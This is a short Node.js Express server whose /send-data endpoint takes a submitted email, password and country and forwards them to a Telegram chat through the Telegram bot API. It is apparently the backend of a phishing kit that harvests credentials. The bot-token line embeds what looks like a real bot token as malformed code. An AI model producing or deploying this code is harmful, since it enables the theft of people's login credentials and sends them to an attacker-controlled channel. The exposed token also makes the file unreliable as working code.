require('dotenv').config(); // This loads your .env file

const express = require('express');
const fetch = require('node-fetch');
const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.json());

app.post('/send-data', (req, res) => {
    const { email, password, country } = req.body;

    // Telegram bot details
    const botToken = process.env.7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M; // Your bot token from .env
    const chatId = "YOUR_CHAT_ID"; // Replace with your actual chat ID
    const message = `Email: ${email}\nPassword: ${password}\nCountry: ${country}`;

    // Send the data to Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            res.status(200).send('Message sent');
        } else {
            res.status(500).send('Failed to send message');
        }
    })
    .catch(error => {
        console.error('Error sending message:', error);
        res.status(500).send('Internal server error');
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
